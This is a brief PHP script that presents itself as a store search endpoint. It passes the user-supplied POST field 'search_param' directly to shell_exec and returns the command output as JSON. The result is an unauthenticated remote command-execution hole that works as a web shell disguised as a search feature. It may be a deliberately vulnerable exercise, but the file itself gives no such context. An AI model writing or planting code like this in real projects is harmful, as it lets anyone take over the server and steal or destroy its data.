<?php
header('Content-Type: application/json');

if ($_SERVER["REQUEST_METHOD"] == "POST") 
{
    $enteredInput = $_POST['search_param'];
    
    if (strlen($enteredInput) == 0)
    {
        echo json_encode(['result' => "Search bar cannot be empty"]);
    }

    else
    {
        $result = shell_exec($enteredInput);

        if ($result == null)
        {
            echo json_encode(['result' => ($enteredInput . " not found in store")]);
        }

        else
        {
            echo json_encode(['result' => $result]);
        }
    }

} 

else 
{
    http_response_code(404);
    echo json_encode(['error' => 'Access Forbidden']);
}
?>
